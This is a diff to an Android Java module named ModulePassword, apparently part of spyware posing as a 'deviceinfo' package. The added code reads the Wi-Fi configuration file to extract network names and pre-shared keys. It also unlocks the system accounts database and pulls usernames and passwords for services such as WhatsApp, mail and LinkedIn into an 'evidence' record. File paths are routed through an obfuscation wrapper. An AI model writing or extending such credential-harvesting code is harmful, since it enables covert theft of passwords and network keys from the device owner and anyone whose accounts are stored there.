@@ -1,15 +1,13 @@
 package com.android.deviceinfo.module;
 
 import java.io.File;
-import java.io.IOException;
+import java.io.FileInputStream;
 import java.util.HashMap;
 import java.util.Iterator;
+import java.util.List;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteQueryBuilder;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -22,8 +20,8 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
-import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModulePassword extends BaseModule {
 
@@ -43,6 +41,7 @@ public class ModulePassword extends BaseModule {
 			services.put("whatsapp", 0x07);
 			services.put("mail", 0x09);
 			services.put("linkedin", 0x0a);
+			services.put("wifi", 0x0b);
 
 			return true;
 		} else {
@@ -98,34 +97,77 @@ public class ModulePassword extends BaseModule {
 					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
 						return jid;
 					} else {
-						lastPasswords.put( jid, value);
+						lastPasswords.put(jid, value);
 						needToSerialize = true;
 					}
 
-					evidence.write(WChar.getBytes(type, true));
-					evidence.write(WChar.getBytes(name, true));
-					evidence.write(WChar.getBytes(password, true));
-					evidence.write(WChar.getBytes(service, true));
-					evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
+					addToEvidence(evidence, name, type, password, service);
 
 				}
-				
+
 				return jid;
 			}
 		};
 
+		dumpWifi();
 		dumpAccounts(passwordVisitor);
+
+	}
+
+	private void dumpWifi() {
+		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
+		if (!Path.unprotect(filename, 2, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpWifi) no passwords found");
+			}
+			return;
+		}
+		List<String> lines = StringUtils.readFileLines(filename);
+		String ssid = "";
+		String psk = "";
+		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+		for (String line : lines) {
+			if (line.contains("ssid")) {
+				ssid = getValue(line);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
+				}
+			} else if (line.contains("psk")) {
+				psk = getValue(line);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (dumpWifi) psk = %s", psk);
+				}
+				addToEvidence(evidence, ssid, "SSID", psk, "Wifi");
+			}
+		}
+		evidence.close();
+
+	}
+
+	private String getValue(String line) {
+		String[] parts = line.split("=");
+		if (parts.length == 2) {
+			return parts[1];
+		}
+		return null;
 	}
 
 	public static void dumpAccounts(RecordVisitor visitor) {
 		// h_0=/data/system/
 		// h_1=/data/system/users/0/
 		// h_2=accounts.db
-		String pathUser = Messages.getString("h_1");
-		String pathSystem = Messages.getString("h_0");
-		String file = Messages.getString("h_2");
+		String pathUser = M.e("/data/system/users/0/");
+		String pathSystem = M.e("/data/system/");
+		String file = M.e("accounts.db");
 
 		String dbFile = "";
+
+		if (!Path.unprotect(pathUser, 3, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAccounts) error: cannot open path");
+			}
+			return;
+		}
 
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
 		if (helper == null) {
@@ -134,19 +176,18 @@ public class ModulePassword extends BaseModule {
 
 		if (helper == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db" );
+				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
 			}
 		}
 
 		// h_4=accounts
-		String table = Messages.getString("h_4");
+		String table = M.e("accounts");
 
 		// h_5=_id
 		// h_6=name
 		// h_7=type
 		// h_8=password
-		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
-				Messages.getString("h_8") };
+		String[] projection = { M.e("_id"), M.e("name"), M.e("type"), M.e("password ") };
 		visitor.projection = projection;
 
 		helper.traverseRecords(table, visitor);
@@ -187,6 +228,14 @@ public class ModulePassword extends BaseModule {
 	@Override
 	protected void actualStop() {
 
+	}
+
+	private void addToEvidence(EvidenceReference evidence, String name, String type, String password, String service) {
+		evidence.write(WChar.getBytes(type, true));
+		evidence.write(WChar.getBytes(name, true));
+		evidence.write(WChar.getBytes(password, true));
+		evidence.write(WChar.getBytes(service, true));
+		evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
 	}
 
 }
